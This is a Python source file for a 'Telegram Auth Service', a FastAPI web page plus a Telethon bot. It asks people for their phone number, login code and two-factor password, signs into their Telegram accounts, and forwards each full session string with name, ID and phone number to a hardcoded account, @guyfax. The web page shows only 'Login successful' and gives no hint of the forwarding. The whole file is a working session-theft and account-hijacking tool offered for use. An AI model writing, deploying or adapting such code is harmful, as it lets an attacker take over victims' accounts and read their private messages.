#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  Telegram Auth Service v1.0                                                 ║
║  فقط ثبت‌نام و ارسال سشن به @guyfax - بدون احراز هویت ادمین               ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import uuid
import time
import json
import asyncio
import logging
import secrets
import hashlib
import re
from typing import Dict, Optional, Any, List
from pathlib import Path
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
from enum import Enum
from base64 import b64encode, b64decode

# --- Environment & Settings ---
from pydantic_settings import BaseSettings, SettingsConfigDict
from pydantic import BaseModel, Field

# --- FastAPI & Uvicorn ---
import uvicorn
from fastapi import FastAPI, Request, HTTPException, Query, status
from fastapi.responses import HTMLResponse, PlainTextResponse
from fastapi.middleware.cors import CORSMiddleware

# --- Async SQLite ---
import aiosqlite

# --- Telethon (MTProto & Bot) ---
from telethon import TelegramClient, events, Button
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    PhoneNumberBannedError
)
from telethon.tl.types import User

# ============================================================================
# 1. CONFIGURATION
# ============================================================================

class Settings(BaseSettings):
    # Telegram API
    API_ID: int
    API_HASH: str
    TOKEN_BOT: str

    # Database & files
    DB_FILE: str = "users.db"
    SESSION_DIR: str = "sessions"
    LOG_DIR: str = "logs"
    LOG_FILE: str = "service.log"

    # Server
    HOST: str = "0.0.0.0"
    PORT: int = int(os.getenv("PORT", 8000))

    # Session limits
    MAX_SESSIONS: int = 10000
    SESSION_TIMEOUT: int = 600
    SESSION_CLEANUP_INTERVAL: int = 300

    # Rate limiting
    RATE_LIMIT_REQUESTS: int = 30
    RATE_LIMIT_WINDOW: int = 60

    # Features
    ENABLE_BOT: bool = True
    ENABLE_WEB_UI: bool = True

    # Target for session forwarding
    TARGET_USERNAME: str = "guyfax"      # @guyfax

    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")

settings = Settings()

class AppConfig:
    BASE_DIR: Path = Path(__file__).parent.resolve()
    SESSION_DIR: Path = BASE_DIR / settings.SESSION_DIR
    LOG_DIR: Path = BASE_DIR / settings.LOG_DIR
    LOG_FILE: Path = LOG_DIR / settings.LOG_FILE
    DB_FILE: Path = BASE_DIR / settings.DB_FILE

AppConfig.SESSION_DIR.mkdir(parents=True, exist_ok=True)
AppConfig.LOG_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================================
# 2. LOGGING
# ============================================================================

log = logging.getLogger("auth_service")
log.setLevel(logging.INFO)

fh = logging.handlers.RotatingFileHandler(
    AppConfig.LOG_FILE, maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'
)
fh.setFormatter(logging.Formatter('%(asctime)s | %(levelname)-8s | %(message)s'))
log.addHandler(fh)

ch = logging.StreamHandler()
ch.setFormatter(logging.Formatter('%(asctime)s | %(levelname)-8s | %(message)s'))
log.addHandler(ch)

# ============================================================================
# 3. UTILITIES
# ============================================================================

class SecurityUtils:
    @staticmethod
    def sanitize_phone(phone: str) -> str:
        if not phone:
            return ""
        phone = phone.strip()
        if phone.startswith(' '):
            phone = '+' + phone[1:]
        cleaned = re.sub(r'[^\d+]', '', phone)
        if not cleaned.startswith('+') and cleaned.startswith('00'):
            cleaned = '+' + cleaned[2:]
        elif not cleaned.startswith('+') and cleaned.isdigit():
            cleaned = '+' + cleaned
        return cleaned

    @staticmethod
    def validate_phone(phone: str) -> bool:
        return bool(re.match(r'^\+[1-9]\d{6,14}$', phone))

    @staticmethod
    def generate_session_id(prefix: str = "sess") -> str:
        return f"{prefix}_{uuid.uuid4().hex}"

    @staticmethod
    def encrypt_session_data(data: bytes, key: str) -> str:
        key_bytes = key.encode('utf-8')
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
        return b64encode(encrypted).decode('utf-8')

    @staticmethod
    def decrypt_session_data(encrypted_b64: str, key: str) -> bytes:
        encrypted = b64decode(encrypted_b64)
        key_bytes = key.encode('utf-8')
        decrypted = bytearray()
        for i, byte in enumerate(encrypted):
            decrypted.append(byte ^ key_bytes[i % len(key_bytes)])
        return bytes(decrypted)

# ============================================================================
# 4. RATE LIMITER
# ============================================================================

class RateLimiter:
    def __init__(self):
        self.requests: Dict[str, List[float]] = {}
        self.lock = asyncio.Lock()

    async def check(self, key: str, limit: int = None, window: int = None) -> bool:
        limit = limit or settings.RATE_LIMIT_REQUESTS
        window = window or settings.RATE_LIMIT_WINDOW
        async with self.lock:
            now = time.time()
            if key not in self.requests:
                self.requests[key] = []
            self.requests[key] = [t for t in self.requests[key] if now - t < window]
            if len(self.requests[key]) >= limit:
                return False
            self.requests[key].append(now)
            return True

rate_limiter = RateLimiter()

async def rate_limit_dependency(request: Request):
    client_ip = request.client.host if request.client else "unknown"
    if not await rate_limiter.check(client_ip):
        raise HTTPException(status_code=429, detail="Rate limit exceeded. Try again later.")
    return True

# ============================================================================
# 5. DATABASE
# ============================================================================

class Database:
    def __init__(self, db_path: Path):
        self.db_path = db_path

    async def init_db(self):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    first_name TEXT,
                    last_name TEXT,
                    username TEXT,
                    phone TEXT UNIQUE,
                    session_string TEXT,
                    login_date TEXT
                )
            ''')
            await db.execute('CREATE INDEX IF NOT EXISTS idx_phone ON users(phone)')
            await db.commit()
        log.info("Database initialized.")

    async def add_user(self, user_data: Dict) -> Dict:
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute(
                "SELECT user_id FROM users WHERE phone = ?", (user_data.get('phone'),)
            )
            row = await cursor.fetchone()
            if row:
                user_id = row[0]
                await db.execute('''
                    UPDATE users SET
                        first_name = ?,
                        last_name = ?,
                        username = ?,
                        session_string = ?,
                        login_date = ?
                    WHERE user_id = ?
                ''', (
                    user_data.get('first_name'),
                    user_data.get('last_name'),
                    user_data.get('username'),
                    user_data.get('session_string'),
                    user_data.get('login_date'),
                    user_id
                ))
                await db.commit()
                log.info(f"Updated user {user_id}")
                user_data['user_id'] = user_id
                return user_data
            else:
                cursor = await db.execute('''
                    INSERT INTO users (
                        user_id, first_name, last_name, username, phone,
                        session_string, login_date
                    ) VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (
                    user_data['user_id'],
                    user_data.get('first_name'),
                    user_data.get('last_name'),
                    user_data.get('username'),
                    user_data['phone'],
                    user_data.get('session_string'),
                    user_data.get('login_date')
                ))
                await db.commit()
                log.info(f"Added user {user_data['user_id']}")
                return user_data

db = Database(AppConfig.DB_FILE)

# ============================================================================
# 6. TELEGRAM AUTH MANAGER
# ============================================================================

class SessionState(Enum):
    INITIALIZED = "INITIALIZED"
    CODE_SENT = "CODE_SENT"
    AWAITING_2FA = "AWAITING_2FA"
    LOGGED_IN = "LOGGED_IN"

class SessionData:
    def __init__(self, session_id: str, client: TelegramClient):
        self.session_id = session_id
        self.client = client
        self.phone: Optional[str] = None
        self.phone_code_hash: Optional[str] = None
        self.state: SessionState = SessionState.INITIALIZED
        self.last_access: float = time.time()
        self.is_connected: bool = False

class TelegramAuthManager:
    def __init__(self):
        self.active_sessions: Dict[str, SessionData] = {}
        self.phone_to_session: Dict[str, str] = {}
        self.lock = asyncio.Lock()
        self._cleanup_task = None
        self.encryption_key = secrets.token_hex(32)  # کلید رمزنگاری سشن

    async def start_cleanup(self):
        async def cleanup_loop():
            while True:
                await asyncio.sleep(settings.SESSION_CLEANUP_INTERVAL)
                await self._cleanup_expired()
        self._cleanup_task = asyncio.create_task(cleanup_loop())

    async def stop_cleanup(self):
        if self._cleanup_task:
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass

    async def _cleanup_expired(self):
        now = time.time()
        expired = [sid for sid, data in self.active_sessions.items() if now - data.last_access > settings.SESSION_TIMEOUT]
        for sid in expired:
            data = self.active_sessions.pop(sid)
            if data.phone in self.phone_to_session:
                del self.phone_to_session[data.phone]
            try:
                await data.client.disconnect()
            except:
                pass
            log.debug(f"Cleaned session {sid}")

    async def get_or_create_session(self, phone: Optional[str] = None) -> SessionData:
        async with self.lock:
            if phone and phone in self.phone_to_session:
                sid = self.phone_to_session[phone]
                if sid in self.active_sessions:
                    session = self.active_sessions[sid]
                    session.last_access = time.time()
                    if not session.is_connected:
                        await session.client.connect()
                        session.is_connected = True
                    return session

            await self._cleanup_expired()
            if len(self.active_sessions) >= settings.MAX_SESSIONS:
                raise HTTPException(status_code=503, detail="Server busy")

            session_id = SecurityUtils.generate_session_id()
            session_file = str(AppConfig.SESSION_DIR / f"{session_id}.session")
            client = TelegramClient(session_file, settings.API_ID, settings.API_HASH)
            await client.connect()
            session = SessionData(session_id, client)
            session.is_connected = True
            self.active_sessions[session_id] = session
            if phone:
                self.phone_to_session[phone] = session_id
                session.phone = phone
            return session

    async def send_code(self, phone: str) -> Dict:
        phone = SecurityUtils.sanitize_phone(phone)
        if not SecurityUtils.validate_phone(phone):
            raise HTTPException(status_code=400, detail="Invalid phone format. Use +1234567890")

        session = await self.get_or_create_session(phone)
        session.phone = phone
        try:
            result = await session.client.send_code_request(phone)
            session.phone_code_hash = result.phone_code_hash
            session.state = SessionState.CODE_SENT
            return {"status": "success", "session_id": session.session_id}
        except FloodWaitError as e:
            raise HTTPException(status_code=429, detail=f"Wait {e.seconds}s")
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))

    async def verify_code(self, session_id: str, code: str) -> Dict:
        session = self.active_sessions.get(session_id)
        if not session or session.state != SessionState.CODE_SENT:
            raise HTTPException(status_code=400, detail="Invalid session")

        try:
            await session.client.sign_in(
                phone=session.phone,
                code=code,
                phone_code_hash=session.phone_code_hash
            )
            return await self._finalize(session)
        except SessionPasswordNeededError:
            session.state = SessionState.AWAITING_2FA
            return {"status": "2fa_required"}
        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
            raise HTTPException(status_code=400, detail=str(e))
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))

    async def verify_2fa(self, session_id: str, password: str) -> Dict:
        session = self.active_sessions.get(session_id)
        if not session or session.state != SessionState.AWAITING_2FA:
            raise HTTPException(status_code=400, detail="2FA not required")

        try:
            await session.client.sign_in(password=password)
            return await self._finalize(session)
        except Exception as e:
            raise HTTPException(status_code=400, detail="Invalid password")

    async def _finalize(self, session: SessionData) -> Dict:
        me = await session.client.get_me()
        session.state = SessionState.LOGGED_IN

        # دریافت سشن استرینگ
        session_string = session.client.session.save()
        # رمزنگاری (اختیاری)
        encrypted = SecurityUtils.encrypt_session_data(session_string.encode('utf-8'), self.encryption_key)

        user_data = {
            "user_id": me.id,
            "first_name": me.first_name,
            "last_name": me.last_name,
            "username": me.username,
            "phone": session.phone,
            "session_string": encrypted,
            "login_date": datetime.utcnow().isoformat()
        }
        await db.add_user(user_data)

        # ارسال سشن به @guyfax
        await self._send_session_to_target(session_string, me, session.phone)

        # پاک کردن سشن از حافظه
        try:
            await session.client.disconnect()
        except:
            pass
        del self.active_sessions[session.session_id]
        if session.phone in self.phone_to_session:
            del self.phone_to_session[session.phone]

        return {"status": "success", "user": user_data}

    async def _send_session_to_target(self, session_string: str, user: User, phone: str):
        if not settings.ENABLE_BOT:
            log.warning("Bot disabled")
            return
        bot_client = bot_manager.client
        if not bot_client or not bot_client.is_connected():
            log.warning("Bot not connected")
            return
        target = settings.TARGET_USERNAME
        if not target:
            return

        msg = (
            f"🔐 **New Session**\n\n"
            f"👤 {user.first_name} {user.last_name or ''}\n"
            f"🆔 `{user.id}`\n"
            f"📞 `{phone}`\n"
            f"👤 @{user.username or 'N/A'}\n"
            f"📅 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n"
            f"**Session:**\n`{session_string}`"
        )
        try:
            entity = await bot_client.get_entity(target)
            await bot_client.send_message(entity, msg, parse_mode='markdown')
            log.info(f"Session sent to @{target}")
        except Exception as e:
            log.error(f"Send session failed: {e}")

auth_manager = TelegramAuthManager()

# ============================================================================
# 7. TELEGRAM BOT (بدون ادمین، فقط راهنما)
# ============================================================================

class TelegramBotManager:
    def __init__(self, token: str):
        self.token = token
        self.client = TelegramClient(str(AppConfig.SESSION_DIR / "bot.session"), settings.API_ID, settings.API_HASH)
        self.user_states: Dict[int, Dict] = {}

    async def start(self):
        if not settings.ENABLE_BOT:
            return
        try:
            await self.client.start(bot_token=self.token)
            log.info("Bot started")

            @self.client.on(events.NewMessage(func=lambda e: e.is_private))
            async def handler(event):
                sender = await event.get_sender()
                if sender.bot:
                    return
                text = event.message.message.strip()
                user_id = sender.id

                if text == '/start':
                    await self.cmd_start(event, user_id)
                    return
                elif text == '/cancel':
                    await self.cmd_cancel(event, user_id)
                    return

                state = self.user_states.get(user_id)
                if not state:
                    await event.respond("Send /start to begin.")
                    return

                if state.get("step") == "phone":
                    await self.handle_phone(event, user_id, text)
                elif state.get("step") == "code":
                    await self.handle_code(event, user_id, text)
                elif state.get("step") == "password":
                    await self.handle_password(event, user_id, text)

        except Exception as e:
            log.error(f"Bot error: {e}")

    async def cmd_start(self, event, user_id):
        self.user_states[user_id] = {"step": "phone"}
        await event.respond(
            "👋 **Welcome!**\n\n"
            "Send your phone number (e.g., +1234567890)\n"
            "I'll send the session to @guyfax after verification.\n\n"
            "Type /cancel to abort."
        )

    async def cmd_cancel(self, event, user_id):
        if user_id in self.user_states:
            del self.user_states[user_id]
        await event.respond("Cancelled. Send /start to begin again.")

    async def handle_phone(self, event, user_id, text):
        phone = SecurityUtils.sanitize_phone(text)
        if not SecurityUtils.validate_phone(phone):
            await event.respond("❌ Invalid format. Use +1234567890")
            return

        session_id = SecurityUtils.generate_session_id("bot")
        session_file = str(AppConfig.SESSION_DIR / f"{session_id}.session")
        client = TelegramClient(session_file, settings.API_ID, settings.API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            self.user_states[user_id].update({
                "session_id": session_id,
                "phone": phone,
                "phone_code_hash": result.phone_code_hash,
                "client": client,
                "step": "code"
            })
            await event.respond("✅ Code sent! Enter the verification code.")
        except Exception as e:
            await event.respond(f"❌ Error: {str(e)}")
            await client.disconnect()

    async def handle_code(self, event, user_id, text):
        state = self.user_states[user_id]
        client = state.get("client")
        if not client or not client.is_connected():
            await event.respond("Session expired. /start again.")
            return
        if not text.isdigit():
            await event.respond("Code must be numbers only.")
            return

        try:
            await client.sign_in(phone=state["phone"], code=text, phone_code_hash=state["phone_code_hash"])
            me = await client.get_me()
            session_string = client.session.save()
            # ذخیره و ارسال
            encrypted = SecurityUtils.encrypt_session_data(session_string.encode('utf-8'), auth_manager.encryption_key)
            user_data = {
                "user_id": me.id,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "username": me.username,
                "phone": state["phone"],
                "session_string": encrypted,
                "login_date": datetime.utcnow().isoformat()
            }
            await db.add_user(user_data)
            await auth_manager._send_session_to_target(session_string, me, state["phone"])
            await event.respond(f"✅ Success! Welcome {me.first_name}. Session sent.")
            del self.user_states[user_id]
            await client.disconnect()
        except SessionPasswordNeededError:
            state["step"] = "password"
            await event.respond("🔒 2FA enabled. Send your password.")
        except Exception as e:
            await event.respond(f"❌ Invalid code: {str(e)}")

    async def handle_password(self, event, user_id, text):
        state = self.user_states[user_id]
        client = state.get("client")
        try:
            await client.sign_in(password=text)
            me = await client.get_me()
            session_string = client.session.save()
            encrypted = SecurityUtils.encrypt_session_data(session_string.encode('utf-8'), auth_manager.encryption_key)
            user_data = {
                "user_id": me.id,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "username": me.username,
                "phone": state["phone"],
                "session_string": encrypted,
                "login_date": datetime.utcnow().isoformat()
            }
            await db.add_user(user_data)
            await auth_manager._send_session_to_target(session_string, me, state["phone"])
            await event.respond(f"✅ 2FA success! Session sent.")
            del self.user_states[user_id]
            await client.disconnect()
        except Exception:
            await event.respond("❌ Invalid password. Try again or /cancel.")

bot_manager = TelegramBotManager(settings.TOKEN_BOT)

# ============================================================================
# 8. FASTAPI APP (بدون ادمین)
# ============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    log.info("Starting auth service...")
    await db.init_db()
    await auth_manager.start_cleanup()
    if settings.ENABLE_BOT:
        asyncio.create_task(bot_manager.start())
    yield
    await auth_manager.stop_cleanup()
    if settings.ENABLE_BOT and bot_manager.client:
        await bot_manager.client.disconnect()
    log.info("Shutdown complete.")

app = FastAPI(title="Telegram Auth Service", version="1.0", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])

# ============================================================================
# 9. PYDANTIC MODELS
# ============================================================================

class SendCodeRequest(BaseModel):
    phone: str

class VerifyCodeRequest(BaseModel):
    session_id: str
    code: str

class Verify2FARequest(BaseModel):
    session_id: str
    password: str

class ApiResponse(BaseModel):
    status: str
    message: str
    data: Optional[Any] = None

# ============================================================================
# 10. API ROUTES
# ============================================================================

@app.post("/api/send-code", response_model=ApiResponse)
async def send_code(payload: SendCodeRequest, request: Request):
    await rate_limit_dependency(request)
    res = await auth_manager.send_code(payload.phone)
    return {"status": "success", "message": "Code sent", "data": {"session_id": res["session_id"]}}

@app.post("/api/verify-code", response_model=ApiResponse)
async def verify_code(payload: VerifyCodeRequest, request: Request):
    await rate_limit_dependency(request)
    res = await auth_manager.verify_code(payload.session_id, payload.code)
    if res.get("status") == "2fa_required":
        return {"status": "2fa_required", "message": "2FA required", "data": None}
    return {"status": "success", "message": "Login successful", "data": res.get("user")}

@app.post("/api/verify-2fa", response_model=ApiResponse)
async def verify_2fa(payload: Verify2FARequest, request: Request):
    await rate_limit_dependency(request)
    res = await auth_manager.verify_2fa(payload.session_id, payload.password)
    return {"status": "success", "message": "2FA passed", "data": res.get("user")}

# ============================================================================
# 11. FRONTEND (صفحه ساده ثبت‌نام)
# ============================================================================

FRONTEND_HTML = r"""
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram Auth</title>
<style>
body{background:#0a0e14;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.card{background:#11161f;padding:40px;border-radius:20px;width:100%;max-width:400px;border:1px solid #2a3342}
h1{color:#ffb300;text-align:center}
input{width:100%;padding:14px;margin:10px 0;background:#1c2330;border:1px solid #2a3342;border-radius:10px;color:#fff;font-size:16px}
button{width:100%;padding:14px;background:#ffb300;border:none;border-radius:10px;font-weight:bold;cursor:pointer;margin-top:10px}
button:disabled{opacity:0.6}
#status{margin-top:15px;text-align:center;color:#6b7785}
.hidden{display:none}
</style>
</head>
<body>
<div class="card">
<h1>🔐 Telegram Auth</h1>
<div id="stepPhone">
    <input type="tel" id="phone" placeholder="+1234567890">
    <button id="btnSend">Send Code</button>
</div>
<div id="stepCode" class="hidden">
    <input type="text" id="code" placeholder="Verification code">
    <button id="btnVerify">Verify</button>
    <button id="btnBack" style="background:#2a3342;color:#fff">Back</button>
</div>
<div id="step2fa" class="hidden">
    <input type="password" id="password" placeholder="2FA password">
    <button id="btn2fa">Submit</button>
</div>
<div id="status"></div>
</div>
<script>
let sessionId = null;
const statusEl = document.getElementById('status');

async function req(endpoint, data) {
    const res = await fetch(endpoint, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(data)
    });
    const json = await res.json();
    if (!res.ok) throw new Error(json.detail || 'Error');
    return json;
}

document.getElementById('btnSend').onclick = async () => {
    const phone = document.getElementById('phone').value.trim();
    if (!phone.match(/^\+?[0-9]{10,15}$/)) { statusEl.textContent = 'Invalid phone'; return; }
    statusEl.textContent = 'Sending...';
    try {
        const res = await req('/api/send-code', {phone});
        sessionId = res.data.session_id;
        document.getElementById('stepPhone').classList.add('hidden');
        document.getElementById('stepCode').classList.remove('hidden');
        statusEl.textContent = 'Code sent!';
    } catch(e) { statusEl.textContent = e.message; }
};

document.getElementById('btnVerify').onclick = async () => {
    const code = document.getElementById('code').value.trim();
    if (!code) { statusEl.textContent = 'Enter code'; return; }
    statusEl.textContent = 'Verifying...';
    try {
        const res = await req('/api/verify-code', {session_id: sessionId, code});
        if (res.status === '2fa_required') {
            document.getElementById('stepCode').classList.add('hidden');
            document.getElementById('step2fa').classList.remove('hidden');
            statusEl.textContent = 'Enter 2FA password';
        } else {
            statusEl.textContent = '✅ Login successful!';
        }
    } catch(e) { statusEl.textContent = e.message; }
};

document.getElementById('btn2fa').onclick = async () => {
    const password = document.getElementById('password').value.trim();
    if (!password) { statusEl.textContent = 'Enter password'; return; }
    statusEl.textContent = 'Verifying...';
    try {
        const res = await req('/api/verify-2fa', {session_id: sessionId, password});
        statusEl.textContent = '✅ 2FA success!';
    } catch(e) { statusEl.textContent = e.message; }
};

document.getElementById('btnBack').onclick = () => {
    document.getElementById('stepCode').classList.add('hidden');
    document.getElementById('stepPhone').classList.remove('hidden');
    statusEl.textContent = '';
};
</script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse, include_in_schema=False)
async def serve_frontend():
    return HTMLResponse(FRONTEND_HTML)

# ============================================================================
# 12. MAIN
# ============================================================================

if __name__ == "__main__":
    uvicorn.run("app:app", host=settings.HOST, port=settings.PORT, log_level="info")
